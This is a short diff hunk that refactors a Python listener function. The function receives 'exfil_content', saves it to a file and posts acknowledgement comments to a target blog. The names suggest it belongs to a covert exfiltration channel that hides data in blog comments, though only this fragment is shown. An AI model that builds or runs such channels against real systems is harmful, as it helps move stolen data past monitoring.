@@ -55,9 +55,11 @@ def thread_start_listener():
             f.write(to_write)
             f.close()
 
-            comment_id = exfil_content.split(":")[0]
-            log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Received comment with ID " + comment_id + ". Sending acknowledgement...", 1)
-            response = submit_comment(channel.target_blog, channel.ack_channel_id, comment_id)
+            comment = Comment()
+            comment.sender = sender
+            comment.comment = exfil_content.split(":")[0]
+            log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Received comment with ID " + comment.comment + ". Sending acknowledgement...", 1)
+            response = submit_comment(channel.target_blog, channel.ack_channel_id, comment)
             log_print("## " + str(response.html_response_code) + ", " + response.html_response, 2)
 
         btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)            
